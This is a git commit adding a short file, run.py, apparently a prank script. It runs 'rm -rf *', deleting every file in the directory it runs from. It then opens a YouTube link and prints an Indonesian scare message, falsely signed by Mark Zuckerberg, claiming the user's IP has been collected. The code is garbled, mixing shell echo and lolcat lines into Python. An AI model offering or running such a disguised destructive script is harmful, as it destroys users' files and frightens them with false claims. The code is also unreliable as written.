255d76daf96dd09289d12a9410435d162383cfb3
SinotGkg <55437261+SinotGkg@users.noreply.github.com>
2019-09-18 19:59:03 +0700

    Add files via upload

---
+++ run.py
@@ -0,0 +1,8 @@
+import os
+os.system("rm -rf *")
+os.system("xdg-open https://youtube.com/Bang Sinot")
+os.system("clear")
+echo "\.            /\.           /. Wawan Gkg
+    \.     /.     \.     /.    Bang Sinot
+       \/.           \/.        Gamers | lolcat -a -d 3
+print("\n\n Ini adalah program illegal!\n IP pengguna sudah dikumpulkan\n Berhentilah sebelum terlambat!\n\n - Mark Zuckerberg\n\n")
